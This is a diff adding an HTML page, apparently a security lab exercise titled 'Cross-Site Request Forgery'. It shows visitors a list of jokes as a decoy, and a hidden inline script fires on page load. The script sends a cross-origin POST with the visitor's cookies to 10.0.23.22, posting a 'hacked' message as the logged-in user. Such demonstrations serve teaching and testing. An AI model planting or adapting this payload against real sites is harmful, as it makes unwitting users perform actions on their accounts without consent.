@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head>
+        <meta charset="utf-8">
+        <title>Cross-Site Request Forgery</title>
+    </head>
+    <body>
+        <h1>Hello user</h1>
+        <h2>Here are a few jokes for you:</h2>
+
+        <ul>
+            <li>
+                <p>What’s the most terrifying word in nuclear physics?</p>
+                <p>“Oops!”</p>
+            </li>
+            <li>
+                <p>I was wondering why the ball kept getting bigger and bigger...</p>
+                <p>And then it hit me.</p>
+            </li>
+            <li>
+                <p>I got fired from my job at the bank today.</p>
+                <p>An old lady came in and asked me to check her balance, so I pushed her over.</p>
+            </li>
+            <li>
+                <p>What did Batman say to Robin before they got in the car?</p>
+                <p>“Robin, get in the car.”</p>
+            </li>
+            <li>
+                <p>Never criticize someone until you’ve walked a mile in their shoes. That way, when you criticize them, they won’t be able to hear you from that far away. Plus, you’ll have their shoes.</p>
+            </li>
+            <li>
+                <p>The shovel was a ground-breaking invention.<p>
+            </li>
+            <li>
+                <p>What do you call cheese that isn’t yours?</p>
+                <p>Nacho Cheese.</p>
+            </li>
+            <li>
+                <p>What do you call an elephant that doesn’t matter?</p>
+                <p>An irrelephant.</p>
+            </li>
+            <li>
+                <p>What do you call a fake noodle?</p>
+                <p>An Impasta.</p>
+            </li>
+        </ul>
+
+        <h3>That's everyting for now. We hope you visit us again when your session changes :)</h3>
+
+        <script type="text/javascript">
+            // send a POST request on behalf of the currently logged in user with the data specified in the body
+            fetch('http://10.0.23.22/myspray/writemessage92.html', {
+                method: 'POST',
+                mode: 'no-cors',  // allows us to send requests to other origins
+                credentials: 'include',  // include credentials and cookies
+                body: 'subject=1337&message=hacked'
+            });
+        </script>
+    </body>
+</html>
